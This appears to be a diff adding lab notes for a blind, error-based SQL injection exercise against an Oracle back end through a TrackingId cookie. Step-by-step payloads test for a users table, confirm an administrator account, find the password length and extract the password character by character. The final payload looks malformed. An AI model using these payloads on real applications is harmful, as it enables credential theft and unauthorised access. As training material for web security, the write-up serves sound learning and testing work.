@@ -1,0 +1,23 @@
+End Task
+    1- Get administrator credentials.
+    2- login as administrator
+
+1- Use this payload in the TrackingId parameter in the cookies
+    ' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a' -- -
+    It returns an 'Internal Server Error' error.
+
+2- Check if users table is there
+    ' AND (SELECT CASE WHEN ((select 'z' from users WHERE ROWNUM = 1)='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a' -- -
+    In case of true, it returns '500 Internal Server Error', else '200 ok'
+
+3- Check if administrator is found in users table as username
+    ' AND (SELECT CASE WHEN ((select 'a' from users WHERE ROWNUM = 1 and username='administrator')='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a' -- -
+    In case of true, it returns '500 Internal Server Error', else '200 ok'
+
+4- Get administrator's password length 
+    ' AND (SELECT CASE WHEN ((select LENGTH(password) from users WHERE ROWNUM = 1 and username='administrator')=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a' -- -
+    Password Length: 20
+
+5- Get Password Character by Character using the same payload
+    ' AND (SELECT CASE WHEN ((select SUBSTR(password, 1, 1) from users where username='administrator')='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a' -- -
+    ' AND (select case when SUBSTR(password, 1, 1)='a' then TO_CHAR(1/0) else 'a' from users where username='administrator')='a' -- -
